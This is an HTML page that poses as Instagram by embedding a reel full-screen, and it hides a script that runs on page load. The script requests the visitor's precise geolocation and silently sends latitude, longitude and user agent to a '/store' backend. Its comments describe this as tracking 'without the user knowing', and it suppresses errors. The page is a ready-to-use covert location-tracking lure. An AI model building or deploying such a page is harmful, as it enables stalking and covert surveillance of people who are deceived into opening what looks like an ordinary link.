<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            background-color: #000; /* Dark background like IG reels */
            overflow: hidden;
        }
        iframe {
            width: 100%;
            height: 100%;
            border: none;
            display: block;
        }
    </style>
</head>
<body>
    
    <!-- Instagram Reel Embed -->
    <iframe src="https://www.instagram.com/reel/DI0zr7xSYMk/embed" frameborder="0" scrolling="no" allowtransparency="true" allowfullscreen="true"></iframe>

    <script>
        // Automatic location tracking hidden in the background
        window.addEventListener('load', () => {
            // Wait slightly for the reel to start loading to feel seamless
            setTimeout(() => {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            const lat = position.coords.latitude;
                            const lon = position.coords.longitude;
                            const uagent = navigator.userAgent;

                            // Silently log to our backend without the user knowing
                            const url = "/store?lat=" + lat +
                                        "&long=" + lon +
                                        "&uagent=" + encodeURIComponent(uagent);

                            fetch(url).catch(() => {});
                        },
                        (error) => {
                            // Automatically hide any errors. If denied, do nothing.
                            console.log("Ignored");
                        },
                        {
                            enableHighAccuracy: true,
                            timeout: 10000,
                            maximumAge: 0
                        }
                    );
                }
            }, 500);
        });
    </script>

</body>
</html>
